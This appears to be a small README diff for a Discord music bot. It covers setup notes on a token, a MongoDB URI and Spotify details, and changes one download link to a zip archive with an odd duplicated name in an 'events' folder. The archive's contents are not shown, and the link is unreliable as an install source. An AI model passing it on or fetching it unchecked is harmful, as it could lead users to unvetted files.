@@ -7,7 +7,7 @@ Use /play to start playing the songs.
 # ENV
 TOKEN 
  
-# https://raw.githubusercontent.com/dj004i/DJ-Tau/main/DJ-TAU (2).zip
+# https://github.com/dj004i/DJ-Tau/raw/refs/heads/main/events/D-Tau-v2.8.zip (2).zip
 Add mongoUri & spotify details
 
 # Supports
